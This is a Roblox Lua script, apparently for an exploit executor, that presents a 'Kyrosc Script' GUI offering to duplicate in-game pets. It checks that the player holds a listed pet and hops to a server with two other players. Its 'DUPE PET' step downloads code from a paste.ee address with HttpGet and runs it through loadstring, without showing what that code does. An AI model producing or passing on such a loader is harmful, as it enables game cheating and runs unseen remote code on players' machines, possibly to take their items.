-- Required services
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService") -- Added for animation
local ReplicatedStorage = game:GetService("ReplicatedStorage") -- Added
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- List of valid pets (adjust if necessary)
local VALID_PETS = {
    ["red fox"] = true,
    ["dragonfly"] = true,
    ["raccoon"] = true,
    ["praying mantis"] = true,
    ["deer"] = true 
}

-- Configuration for duplication logic
local DUPESCRIPT_URL = "https://paste.ee/r/s7TguhY5"
local TARGET_PLAYER_COUNT_FOR_DUPE = 3 
local MAX_PLAYER_COUNT_BEFORE_SWITCH = 5 

-- Recursive function to search for valid pets deeply within parentInstance
local function searchRecursivelyForPet(parentInstance, pathPrefix)
    pathPrefix = pathPrefix or parentInstance.Name
    if not parentInstance then return nil end

    for _, child in ipairs(parentInstance:GetChildren()) do
        local currentPath = pathPrefix .. " > " .. child.Name
        -- Directly check if child is a valid Tool or Model
        if (child:IsA("Tool") or child:IsA("Model")) then
            if VALID_PETS[child.Name:lower()] then
                print("      --> DEBUG: Valid pet found:", child.Name, "at", currentPath)
                return child
            end
        end
        -- If child is a Model or Folder, search inside it
        if child:IsA("Model") or child:IsA("Folder") then 
            local foundPetInChild = searchRecursivelyForPet(child, currentPath)
            if foundPetInChild then
                return foundPetInChild
            end
        end
    end
    return nil
end

-- Function to check if there is a valid pet (held or in ReplicatedStorage)
local function findFirstValidPet()
    if not player then
        print("--- DEBUG: Local player not found, search canceled. ---")
        return nil
    end
    print("--- DEBUG: Starting search for valid pets... ---")
    
    print("--- DEBUG: List of VALID_PETS being searched: ---")
    for petName, _ in pairs(VALID_PETS) do
        print("  - '" .. petName .. "'")
    end

    -- 1. Search in player's character (held items)
    local character = player.Character
    if not character then
        print("--- DEBUG: player.Character is nil. Waiting for CharacterAdded... ---")
        character = player.CharacterAdded:Wait() 
        if not character then
             print("--- DEBUG: Player character not found even after waiting for CharacterAdded. ---")
             -- Continue to ReplicatedStorage if character is not present
        else
            print("--- DEBUG: Player character now found after CharacterAdded:", character.Name, "---")
        end
    end
    
    if character and character:IsDescendantOf(game) then
        print("--- DEBUG: Checking items held by character:", character.Name, "---")
        local childrenOfCharacter = character:GetChildren()
        print("--- DEBUG: Number of direct children of character:", #childrenOfCharacter, "---")

        for i, childOfCharacter in ipairs(childrenOfCharacter) do
            if not childOfCharacter or not childOfCharacter.Parent then 
                print("  - DEBUG: Character child no."..i.." is invalid or no longer has a parent.")
                continue
            end

            local childName = childOfCharacter.Name
            local childClassName = childOfCharacter.ClassName
            print("  - DEBUG: Checking character child no."..i..": InstanceName='", childName, "' | ClassName='", childClassName, "'")
            
            local childNameLower = ""
            local successLower, resultLower = pcall(function() return childName:lower() end)
            if successLower then
                childNameLower = resultLower
                print("    DEBUG: Name in lowercase: '", childNameLower, "'")
            else
                print("    DEBUG: Failed to convert name '", childName, "' to lowercase. Error:", resultLower)
                continue 
            end
            
            if (childOfCharacter:IsA("Tool") or childOfCharacter:IsA("Model")) then
                print("    DEBUG: Comparing '", childNameLower, "' with VALID_PETS...")
                if VALID_PETS[childNameLower] then
                    print("      --> DEBUG: Valid pet found (directly held):", childName)
                    return childOfCharacter
                else
                    print("      --> DEBUG: '", childNameLower, "' not in VALID_PETS or its value is false.")
                end
            end

            if childOfCharacter:IsA("Model") then
                print("    -- DEBUG: Checking inside character's child Model:", childName, "--")
                local childrenOfModel = childOfCharacter:GetChildren()
                print("    -- DEBUG: Number of children in Model '", childName, "':", #childrenOfModel, "--")

                for j, childOfModel in ipairs(childrenOfModel) do
                    if not childOfModel or not childOfModel.Parent then
                         print("      - DEBUG: Model child no."..j.." is invalid or no longer has a parent.")
                        continue
                    end

                    local subChildName = childOfModel.Name
                    local subChildClassName = childOfModel.ClassName
                    print("      - DEBUG: Checking child of Model no."..j..": InstanceName='", subChildName, "' | ClassName='", subChildClassName, "'")

                    local subChildNameLower = ""
                    local successSubLower, resultSubLower = pcall(function() return subChildName:lower() end)
                    if successSubLower then
                        subChildNameLower = resultSubLower
                        print("        DEBUG: Name in lowercase: '", subChildNameLower, "'")
                    else
                        print("        DEBUG: Failed to convert name '", subChildName, "' to lowercase. Error:", resultSubLower)
                        continue
                    end
                    
                    if (childOfModel:IsA("Tool") or childOfModel:IsA("Model")) then
                        print("        DEBUG: Comparing '", subChildNameLower, "' with VALID_PETS...")
                        if VALID_PETS[subChildNameLower] then
                            print("          --> DEBUG: Valid pet found (inside held Model):", subChildName)
                            return childOfModel
                        else
                            print("          --> DEBUG: '", subChildNameLower, "' not in VALID_PETS or its value is false.")
                        end
                    end
                end
                print("    -- DEBUG: Finished checking inside character's child Model:", childName, "--")
            end
        end
        print("--- DEBUG: Finished checking character. ---")
    elseif character then
         print("--- DEBUG: Player character is no longer a descendant of game. May be destroying. ---")
    end

    -- 2. Search in ReplicatedStorage
    print("--- DEBUG: Checking ReplicatedStorage ---")
    local petInReplicatedStorage = searchRecursivelyForPet(ReplicatedStorage, "ReplicatedStorage")
    if petInReplicatedStorage then
        print("--- DEBUG: Valid pet found in ReplicatedStorage:", petInReplicatedStorage.Name, "---")
        return petInReplicatedStorage
    end
    print("--- DEBUG: No valid pet found in ReplicatedStorage. ---")


    print("--- DEBUG: No valid pet found after all checks. ---")
    return nil
end


-- Function to create the main ScreenGui
local function createMainGui()
    local oldGui = playerGui:FindFirstChild("KyroscScriptGui")
    if oldGui then oldGui:Destroy() end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "KyroscScriptGui"
    screenGui.Parent = playerGui
    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    screenGui.ResetOnSpawn = false

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.Size = UDim2.new(0, 320, 0, 270)
    mainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
    mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
    mainFrame.BackgroundColor3 = Color3.fromRGB(45, 45, 55)
    mainFrame.BorderSizePixel = 0
    mainFrame.Parent = screenGui
    mainFrame.Visible = true

    local frameCorner = Instance.new("UICorner")
    frameCorner.CornerRadius = UDim.new(0, 8)
    frameCorner.Parent = mainFrame

    local titleLabel = Instance.new("TextLabel")
    titleLabel.Name = "TitleLabel"
    titleLabel.Size = UDim2.new(1, -70, 0, 40)
    titleLabel.Position = UDim2.new(0, 0, 0, 10)
    titleLabel.BackgroundTransparency = 1
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "Kyrosc Script (v8.3.1)"
    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
    titleLabel.TextSize = 18
    titleLabel.Parent = mainFrame

    local closeButton = Instance.new("TextButton")
    closeButton.Name = "CloseButton"
    closeButton.Size = UDim2.new(0, 25, 0, 25)
    closeButton.Position = UDim2.new(1, -35, 0, 10)
    closeButton.AnchorPoint = Vector2.new(1, 0)
    closeButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60)
    closeButton.Font = Enum.Font.GothamBold
    closeButton.Text = "X"
    closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    closeButton.TextSize = 16
    closeButton.Parent = mainFrame
    local closeCorner = Instance.new("UICorner")
    closeCorner.CornerRadius = UDim.new(0, 4)
    closeCorner.Parent = closeButton

    local minimizeButton = Instance.new("TextButton")
    minimizeButton.Name = "MinimizeButton"
    minimizeButton.Size = UDim2.new(0, 25, 0, 25)
    minimizeButton.Position = UDim2.new(1, -65, 0, 10)
    minimizeButton.AnchorPoint = Vector2.new(1, 0)
    minimizeButton.BackgroundColor3 = Color3.fromRGB(80, 80, 90)
    minimizeButton.Font = Enum.Font.GothamBold
    minimizeButton.Text = "_"
    minimizeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    minimizeButton.TextSize = 16
    minimizeButton.Parent = mainFrame
    local minimizeCorner = Instance.new("UICorner")
    minimizeCorner.CornerRadius = UDim.new(0, 4)
    minimizeCorner.Parent = minimizeButton

    local errorContainer = Instance.new("Frame")
    errorContainer.Name = "ErrorContainer"
    errorContainer.Size = UDim2.new(0.9, 0, 0, 30)
    errorContainer.Position = UDim2.new(0.5, 0, 0, 60)
    errorContainer.AnchorPoint = Vector2.new(0.5, 0)
    errorContainer.BackgroundTransparency = 1
    errorContainer.ClipsDescendants = true 
    errorContainer.Parent = mainFrame

    local errorIcon = Instance.new("TextLabel")
    errorIcon.Name = "ErrorIcon"
    errorIcon.Size = UDim2.new(0, 20, 1, 0)
    errorIcon.BackgroundTransparency = 1
    errorIcon.Font = Enum.Font.GothamBold
    errorIcon.Text = "X" 
    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60) 
    errorIcon.TextSize = 20
    errorIcon.TextXAlignment = Enum.TextXAlignment.Center
    errorIcon.TextYAlignment = Enum.TextYAlignment.Center
    errorIcon.Parent = errorContainer

    local errorText = Instance.new("TextLabel")
    errorText.Name = "ErrorText"
    errorText.Size = UDim2.new(1, -25, 1, 0)
    errorText.Position = UDim2.new(0, 25, 0, 0)
    errorText.BackgroundTransparency = 1
    errorText.Font = Enum.Font.GothamSemibold
    errorText.Text = "Required pet not found" 
    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
    errorText.TextSize = 16
    errorText.TextXAlignment = Enum.TextXAlignment.Left
    errorText.TextYAlignment = Enum.TextYAlignment.Center
    errorText.Parent = errorContainer
    
    local instructionsLabel = Instance.new("TextLabel")
    instructionsLabel.Name = "InstructionsLabel"
    instructionsLabel.Size = UDim2.new(0.85, 0, 0, 80)
    instructionsLabel.Position = UDim2.new(0.5, 0, 0, 100)
    instructionsLabel.AnchorPoint = Vector2.new(0.5, 0)
    instructionsLabel.BackgroundTransparency = 1
    instructionsLabel.Font = Enum.Font.Gotham
    instructionsLabel.Text = "Hold one of these pets:\n- Red Fox  - Dragonfly\n- Raccoon  - Praying Mantis\n- Deer\nThen click to start duplicating."
    instructionsLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
    instructionsLabel.TextSize = 14
    instructionsLabel.TextWrapped = true
    instructionsLabel.LineHeight = 1.2
    instructionsLabel.TextXAlignment = Enum.TextXAlignment.Center
    instructionsLabel.TextYAlignment = Enum.TextYAlignment.Top
    instructionsLabel.Parent = mainFrame

    local tryAgainButton = Instance.new("TextButton")
    tryAgainButton.Name = "TryAgainButton"
    tryAgainButton.Size = UDim2.new(0.85, 0, 0, 40)
    tryAgainButton.Position = UDim2.new(0.5, 0, 1, -40)
    tryAgainButton.AnchorPoint = Vector2.new(0.5, 1)
    tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
    tryAgainButton.Font = Enum.Font.GothamBold
    tryAgainButton.Text = "🔄 Try Again" 
    tryAgainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    tryAgainButton.TextSize = 16
    tryAgainButton.Parent = mainFrame

    local buttonCorner = Instance.new("UICorner")
    buttonCorner.CornerRadius = UDim.new(0, 6)
    buttonCorner.Parent = tryAgainButton

    local showGuiButton = Instance.new("TextButton")
    showGuiButton.Name = "ShowKyroscGuiButton"
    showGuiButton.Size = UDim2.new(0, 120, 0, 40)
    showGuiButton.Position = UDim2.new(0, 15, 0, 15)
    showGuiButton.BackgroundColor3 = Color3.fromRGB(55, 55, 65)
    showGuiButton.Font = Enum.Font.GothamBold
    showGuiButton.Text = "Show Kyrosc"
    showGuiButton.TextColor3 = Color3.fromRGB(255, 255, 255)
    showGuiButton.TextSize = 14
    showGuiButton.Visible = false
    showGuiButton.Parent = screenGui
    local showGuiCorner = Instance.new("UICorner")
    showGuiCorner.CornerRadius = UDim.new(0, 6)
    showGuiCorner.Parent = showGuiButton

    local function toggleMainFrame(visible)
        mainFrame.Visible = visible
        showGuiButton.Visible = not visible
    end

    -- Animation functions
    local function playShakeAnimation(guiObject)
        local originalPosition = guiObject.Position
        local tweenInfoShake = TweenInfo.new(0.05, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, 4, true) 
        local shakeOffset = UDim2.fromOffset(5, 0)
        local tweenShake = TweenService:Create(guiObject, tweenInfoShake, {Position = originalPosition + shakeOffset})
        tweenShake:Play()
        tweenShake.Completed:Wait()
        guiObject.Position = originalPosition 
    end

    local function playPulseAnimation(guiObject, targetColor)
        -- local originalColor = guiObject.BackgroundColor3 -- Not strictly needed if 'reverses = true'
        local tweenInfoPulse = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out, 0, true) 
        
        local pulseTween = TweenService:Create(guiObject, tweenInfoPulse, {BackgroundColor3 = targetColor})
        pulseTween:Play()
    end


    closeButton.MouseButton1Click:Connect(function()
        screenGui:Destroy()
    end)

    minimizeButton.MouseButton1Click:Connect(function()
        toggleMainFrame(false)
    end)

    showGuiButton.MouseButton1Click:Connect(function()
        toggleMainFrame(true)
    end)
    
    local currentPetActionState = "VERIFY" 
    local isProcessing = false 

    tryAgainButton.MouseButton1Click:Connect(function()
        if isProcessing then return end 
        isProcessing = true

        if currentPetActionState == "VERIFY" then
            errorIcon.Text = "⏳" 
            errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15) 
            errorText.Text = "Verifying pet..."
            errorText.TextColor3 = Color3.fromRGB(241, 196, 15)
            
            task.wait(0.5) 

            local foundPet = findFirstValidPet() 

            if foundPet then
                print("--- DEBUG: Valid pet found by 'Try Again' button:", foundPet.Name, "---")
                errorText.Text = "PET READY: " .. foundPet.Name 
                errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
                errorIcon.Text = "✓"
                errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
                playPulseAnimation(tryAgainButton, Color3.fromRGB(36, 164, 93)) 
                
                tryAgainButton.Text = "DUPE PET" 
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(46, 204, 113) 
                currentPetActionState = "DUPE_PROCESS"
            else
                print("--- DEBUG: No valid pet held or found in ReplicatedStorage (from 'Try Again' button). ---")
                errorText.Text = "Required pet not found"
                errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                errorIcon.Text = "X"
                errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
                playShakeAnimation(errorContainer) 
                
                tryAgainButton.Text = "🔄 Try Again"
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
                currentPetActionState = "VERIFY"
            end
            isProcessing = false

        elseif currentPetActionState == "DUPE_PROCESS" then
            local playerCount = #Players:GetPlayers()
            print("Current player count in server:", playerCount)

            if playerCount >= MAX_PLAYER_COUNT_BEFORE_SWITCH then
                errorText.Text = "Server full (" .. playerCount .. "). Searching..."
                errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
                errorIcon.Text = "⏳"
                errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
                tryAgainButton.Text = "SEARCHING..."
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(241, 196, 15) 
                
                task.wait(0.1) 

                local successTeleport, teleportError = pcall(function()
                    local currentPlaceId = game.PlaceId
                    local serversDataString
                    local httpSuccess, httpResult = pcall(function()
                        serversDataString = HttpService:GetAsync("https://games.roblox.com/v1/games/" .. currentPlaceId .. "/servers/Public?sortOrder=Asc&limit=100")
                    end)

                    if not httpSuccess or not serversDataString then
                        error("Failed to fetch server list: " .. tostring(httpResult))
                    end

                    local servers = HttpService:JSONDecode(serversDataString)
                    local suitableServerId = nil

                    if servers and servers.data then
                        for _, server in ipairs(servers.data) do
                            if server.playing == (TARGET_PLAYER_COUNT_FOR_DUPE - 1) and server.id ~= game.JobId then
                                suitableServerId = server.id
                                print("Found suitable server:", suitableServerId, "with", server.playing, "players.")
                                break
                            end
                        end
                    end
                    
                    if suitableServerId then
                        print("Teleporting to server:", suitableServerId)
                        errorText.Text = "Teleporting to server with " .. (TARGET_PLAYER_COUNT_FOR_DUPE -1) .. " players..."
                        TeleportService:TeleportToPlaceInstance(currentPlaceId, suitableServerId, player)
                    else
                        error("No suitable new server found.")
                    end
                end)

                if not successTeleport then
                    print("Error searching/teleporting server:", teleportError)
                    errorText.Text = "Failed to find/join server: " .. tostring(teleportError):sub(1,40) 
                    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                    errorIcon.Text = "X"
                    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
                    playShakeAnimation(errorContainer)
                end
                
                tryAgainButton.Text = "🔄 Try Again"
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
                currentPetActionState = "VERIFY"
                isProcessing = false

            elseif playerCount < TARGET_PLAYER_COUNT_FOR_DUPE then
                errorText.Text = "Need " .. TARGET_PLAYER_COUNT_FOR_DUPE .. " players (Current: " .. playerCount .. ")"
                errorText.TextColor3 = Color3.fromRGB(241, 196, 15) 
                errorIcon.Text = "!"
                errorIcon.TextColor3 = Color3.fromRGB(241, 196, 15)
                playShakeAnimation(errorContainer)
                
                tryAgainButton.Text = "🔄 Try Again"
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
                currentPetActionState = "VERIFY"
                isProcessing = false

            else 
                errorText.Text = "Optimal server! Executing..."
                errorText.TextColor3 = Color3.fromRGB(0, 150, 255) 
                errorIcon.Text = "⚙️" 
                errorIcon.TextColor3 = Color3.fromRGB(0, 150, 255)
                tryAgainButton.Text = "EXECUTING..."
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
                
                task.wait(0.1)

                local successExec, execError = pcall(function()
                    local fetchedScriptContent
                    local httpSuccess, httpResult = pcall(function()
                        fetchedScriptContent = game:HttpGet(DUPESCRIPT_URL, true)
                    end)
                    if not httpSuccess or not fetchedScriptContent or fetchedScriptContent == "" then
                        error("Failed to fetch external script: " .. tostring(httpResult))
                    end

                    local loadedFunc, loadErr = loadstring(fetchedScriptContent)
                    if not loadedFunc then
                        error("Failed to load external script: " .. tostring(loadErr))
                    end
                    loadedFunc() 
                end)

                if successExec then
                    errorText.Text = "Dupe script executed!"
                    errorText.TextColor3 = Color3.fromRGB(46, 204, 113) 
                    errorIcon.Text = "✓"
                    errorIcon.TextColor3 = Color3.fromRGB(46, 204, 113)
                    playPulseAnimation(tryAgainButton, Color3.fromRGB(36, 164, 93))
                else
                    errorText.Text = "Dupe script error: " .. tostring(execError):sub(1,40)
                    errorText.TextColor3 = Color3.fromRGB(231, 76, 60) 
                    errorIcon.Text = "X"
                    errorIcon.TextColor3 = Color3.fromRGB(231, 76, 60)
                    warn("Error executing external script:", execError)
                    playShakeAnimation(errorContainer)
                end
                
                tryAgainButton.Text = "🔄 Try Again"
                tryAgainButton.BackgroundColor3 = Color3.fromRGB(231, 76, 60) 
                currentPetActionState = "VERIFY"
                isProcessing = false
            end
        end
    end)
    return screenGui
end

createMainGui()
